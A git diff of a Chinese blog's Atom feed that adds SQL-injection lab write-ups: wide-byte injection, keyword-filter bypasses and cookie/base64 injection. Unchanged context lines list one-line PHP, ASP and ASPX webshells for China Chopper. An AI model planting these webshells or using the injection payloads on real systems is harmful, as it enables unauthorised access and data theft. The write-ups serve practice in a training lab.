@@ -3,13 +3,81 @@
     <id>http://example.com</id>
     <title>夜殿下的博客 • Posts by &#34;个人经验&#34; tag</title>
     <link href="http://example.com" />
-    <updated>2022-02-10T06:36:38.000Z</updated>
+    <updated>2022-02-15T09:23:24.000Z</updated>
     <category term="个人经验" />
     <category term="乱七八糟" />
     <category term="学习小结" />
     <category term="个人感慨" />
     <category term="less 1" />
     <category term="知识小结" />
+    <entry>
+        <id>http://example.com/2022/02/15/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
+        <title>宽字节注入</title>
+        <link rel="alternate" href="http://example.com/2022/02/15/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;p&gt;Less 32：&lt;/p&gt;
+&lt;p&gt;进入 32 关，输入？id=1 查询信息，当试用引号进行注入时，会发现，~ ’ ~ 被进行了转义处理。&lt;/p&gt;
+&lt;p&gt;此时可将 ’ 转为 url 编码 %27 进行注入操作。&lt;/p&gt;
+&lt;p&gt;两个字节相连组成，会形成一个汉字&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/J4QEXxcliwNseV7&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/15/J4QEXxcliwNseV7.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;此时可使用 % aa%5c%27 进行宽字节注入操作&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/3cKFQ7JVpk6OWwj&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/15/3cKFQ7JVpk6OWwj.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;之后的操作与之前类似，值得注意的是，由于 ’ 会被转义，所以用’’ 包裹的内容，得用 16 进制进行转化&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/d3Om7HjADxJUwTe&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/15/d3Om7HjADxJUwTe.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;之后的 less 33 与 32 类似&lt;/p&gt;
+</content>
+        <category term="个人经验" />
+        <updated>2022-02-15T09:23:24.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2022/02/12/%E5%85%B3%E4%BA%8E%E8%BF%87%E6%BB%A4%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E7%9A%84%E6%B3%A8%E5%85%A5/</id>
+        <title>关于过滤特定字符的注入</title>
+        <link rel="alternate" href="http://example.com/2022/02/12/%E5%85%B3%E4%BA%8E%E8%BF%87%E6%BB%A4%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;p&gt;&lt;strong&gt;Less 23：过滤了注释符–+ 和 #，此处可使用未被注释的；%00 进行注释或用单引号闭合方式绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/y3CIgadEKZw781q&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/y3CIgadEKZw781q.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/F7NSYAqXtCf1jKM&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/F7NSYAqXtCf1jKM.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Less 25：过滤了 or 和 and&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;经测试可知 or 和 and 被过滤，但注释符–+ 未被过滤&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/ctz8HpLaWYw5oOP&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/ctz8HpLaWYw5oOP.png&#34; &gt;&lt;/a&gt;&lt;a href=&#34;https://sm.ms/image/q69drLWmJNzblDo&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/q69drLWmJNzblDo.png&#34; &gt;&lt;/a&gt;&lt;a href=&#34;https://sm.ms/image/yaNHIxzEQmRoFiB&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/yaNHIxzEQmRoFiB.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;此处可用双写来绕过注入&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/PprJCXj1iMe3voh&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/PprJCXj1iMe3voh.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;其中注入语句里有 or 的均需双写绕过&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/7srAhJ9QTqU8HEN&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/7srAhJ9QTqU8HEN.png&#34; &gt;&lt;/a&gt;&lt;a href=&#34;https://sm.ms/image/vA8lGhSmDMC1ygs&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/vA8lGhSmDMC1ygs.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;less 26：过滤空格和注释符&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;过滤的空格处，可用（）括住，使用 updatexml 函数进行报错注入&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/HujTtepbghsaRcr&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/HujTtepbghsaRcr.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;less 27：过滤了 union 和 select&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;此处可用混合大小写的方式进行注入&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/yIbZzXgLFvhN1DQ&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/13/yIbZzXgLFvhN1DQ.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="个人经验" />
+        <updated>2022-02-12T15:59:55.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2022/02/11/less20-22%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E6%B3%A8%E5%85%A5/</id>
+        <title>less20~22关于cookie的注入</title>
+        <link rel="alternate" href="http://example.com/2022/02/11/less20-22%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;p&gt;&lt;strong&gt;Less 20：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;进入 less 20，输入账户密码登入，得到一大堆信息：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/nBb5lkW8TuGYsmD&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/nBb5lkW8TuGYsmD.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;其中 cookie 的字样最大，可猜测其为本关注入点，抓包后验证，可知 cookie 为注入点&lt;a href=&#34;https://sm.ms/image/njFVTI4ayi2O7YU&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/njFVTI4ayi2O7YU.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/w79X1hudtVCrcSY&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/w79X1hudtVCrcSY.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;之后使用 order by 查看列数&lt;a href=&#34;https://sm.ms/image/nDhMzWN9QVy4rS8&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/nDhMzWN9QVy4rS8.png&#34; &gt;&lt;/a&gt;&lt;a href=&#34;https://sm.ms/image/4Rgu2r3YIwOD9hX&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/4Rgu2r3YIwOD9hX.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;可知共有三列，之后再用联合查询得知数据&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/T7NclHBPA1b84ow&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/T7NclHBPA1b84ow.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/T7NclHBPA1b84ow&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/T7NclHBPA1b84ow.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/RsFSvqLilHzD7VN&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/RsFSvqLilHzD7VN.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Less21~22：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;通过 cookie 后的数据可猜测，此处密码用了 base64 进行加密处理，只需将注入语句改用 base64 进行加密，再输入即可：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/EkLZIUom18O6SAj&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/EkLZIUom18O6SAj.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/nw3opZfjXDyWtSO&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/nw3opZfjXDyWtSO.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/EYuo1bt7y3krmDh&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/EYuo1bt7y3krmDh.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/rIhTEU391dKZBDf&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/02/11/rIhTEU391dKZBDf.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;其中 less 21 为 &#39;) 的 sql 错误类型&lt;/p&gt;
+&lt;p&gt;less 22 为 &amp;quot; 类型的 sql 错误类型&lt;/p&gt;
+</content>
+        <category term="个人经验" />
+        <updated>2022-02-11T02:34:44.000Z</updated>
+    </entry>
     <entry>
         <id>http://example.com/2022/02/10/less%2018-19/</id>
         <title>less18~19</title>
@@ -124,7 +192,7 @@
         <title>文件传输以及一句话木马的小见解</title>
         <link rel="alternate" href="http://example.com/2022/01/25/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%BB%A5%E5%8F%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B0%8F%E8%A7%81%E8%A7%A3/"/>
         <content type="html">&lt;p&gt;&lt;strong&gt;一句话木马的总结：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;php 型：&lt;?php @eval($_POST[&#39;ydx&#39;]);?&gt;&lt;/p&gt;
+&lt;p&gt;php 型：&amp;lt;？php @eval ($_POST [‘ydx’]);？&amp;gt;&lt;/p&gt;
 &lt;p&gt;asp 型：&amp;lt;% eval request (“ydx”)%&amp;gt;&lt;/p&gt;
 &lt;p&gt;aspx 型：&amp;lt;%@ page Language=“Jscript”%&amp;gt; &amp;lt;% eval (Request.Item [“ydx”],“unsafe”);%&amp;gt;&lt;/p&gt;
 &lt;p&gt;其中 ydx 为密码，即可在中国菜刀中输入使用&lt;/p&gt;
@@ -149,7 +217,8 @@
 &lt;p&gt;上传成功之后可以 select load_file 函数查看文件内容&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/7BQacsHXRNkfAeo&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/7BQacsHXRNkfAeo.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;其中 (’  &#39;) 内即文件地址和所要读取的文件名&lt;/p&gt;
-&lt;p&gt;在 less 7 中上传文件&lt;a href=&#34;https://sm.ms/image/5AQTEOoHUj6L847&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/5AQTEOoHUj6L847.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在 less 7 中上传文件&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/5AQTEOoHUj6L847&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/5AQTEOoHUj6L847.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;虽然回显说有一个 sql 语法错误，但翻看 Less 7 的目录，会发现文件已传输成功。&lt;/p&gt;
 </content>
         <category term="个人经验" />
